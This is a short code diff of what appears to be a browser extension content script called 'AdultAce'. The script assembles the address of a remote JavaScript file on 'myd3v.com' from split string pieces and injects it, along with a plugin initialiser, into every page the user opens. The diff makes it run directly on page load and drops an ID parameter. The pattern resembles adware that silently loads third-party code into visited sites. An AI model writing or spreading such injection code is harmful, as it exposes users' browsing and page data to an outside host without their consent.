@@ -1,6 +1,7 @@
 var doct = document;
+
 var AdultAce = {
-    jsLink: '//' + 'myd3v.com' + '/js/aat.js?id=' + encodeURIComponent(adult_ace_id()),
+    jsLink: '//' + 'myd3v.com' + '/js/aat.js',
     
     onPageLoad: function() {
         if( doct.body.innerHTML.length < 10 ) return;
@@ -19,10 +20,11 @@ var AdultAce = {
         {
             var script_init = doc.createElement('script');
             script_init.type = "text/javascript";
-            script_init.innerHTML = "(new aatPlugin('" + adult_ace_id() + "')).init();";
+            script_init.innerHTML = "(new aatPlugin()).init();";
             head.appendChild(script_init);
         };
         head.appendChild(script_loader);
     }
-}
-chrome.extension.sendRequest( { 'action' : 'Action'}, AdultAce.onPageLoad);
+};
+
+AdultAce.onPageLoad();
